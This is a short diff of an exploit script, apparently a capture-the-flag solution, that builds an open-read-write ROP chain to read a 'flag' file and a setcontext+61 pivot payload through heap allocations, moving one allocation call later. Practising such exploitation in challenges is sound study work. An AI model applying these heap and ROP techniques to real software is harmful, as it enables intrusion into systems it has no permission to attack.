@@ -152,12 +152,12 @@ rop.base = orw_addr + 0x8
 rop.open(b'flag',0,0)
 rop.read(3,orw_addr + 0x10 +0x200,0x30)
 rop.write(1,orw_addr + 0x10 +0x200,0x30)
-add(0x500,rop.chain()[8:]) #3
 rdi_addr = heap_base + 0x14f0 + 0x10 
 rdi_payload =  p64(0) + p64(rdi_addr) + p64(0) * 2 + p64(libc.sym['setcontext']+61) + p64(0) #0x30
 # 0x0000000000151990 : mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]
 rdi_payload += p64(0) * int(0x70 / 8) + p64(orw_addr+0x10) + rop.chain()[:8]
 
+add(0x500,rop.chain()[8:]) #3
 add(0x300,rdi_payload) #4
 
 load(5)
